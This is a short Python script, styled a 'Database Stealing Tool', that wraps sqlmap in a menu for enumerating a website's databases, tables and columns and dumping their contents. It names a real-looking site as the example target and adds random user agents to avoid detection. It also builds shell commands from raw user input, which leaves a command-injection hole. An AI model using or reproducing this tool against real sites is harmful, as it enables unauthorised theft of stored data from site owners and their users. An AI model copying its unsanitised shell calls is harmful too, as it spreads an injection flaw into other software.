#!/usr/bin/env python

import os

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet DATABASE STEALING")

print("""

Welcome to the Database Stealing Tool Professional or Unprofessional


1) I Only Know the Explicit Link

2) I Know the Detailed Link and Database Name

3) I Know the Detailed Link, Database Name and Table Name

4) I Know the Detailed Link, Database Name, Table Name and Column Name

5) I Don't Know Anything


Link with Example Description: http://www.suesupriano.com/article.php?id=25

""")

no = raw_input("Enter a number: ")

if(no=="1"):
	clrlink = raw_input("Enter a clear link: ")
	os.system("sqlmap -u " +clrlink + " --dbs --random-agent")
elif(no=="2"):
	clrlink = raw_input("Enter a clear link: ")
	database = raw_input("Enter database Name:")
	os.system("sqlmap -u " + clrlink + " -D " + database + " --tables --random-agent")
elif(no=="3"):
	clrlink = raw_input("Enter a clear link: ")
	database = raw_input("Enter database Name: ")
	tablo = raw_input("Enter Table Name: ")
	os.system("sqlmap -u " + clrlink + " -D " + database + " -T " + tablo + " --columns --random-agent")
elif(no=="4"):
	clrlink = raw_input("Enter a clear link: ")
	database = raw_input("Enter database Name: ")
	tablo = raw_input("Enter Table Name: ")
	colon = raw_input("Enter Column Name: ")
	os.system("sqlmap -u " + clrlink + " -D " + database + " -T " + tablo + " -C " + colon + " --dump --random-agent")
elif(no=="5"):
	print("I'm Closing the Program Reis, I'm Sorry I Can't Help You")
else:
	print("Wrong Selection I'm Closing")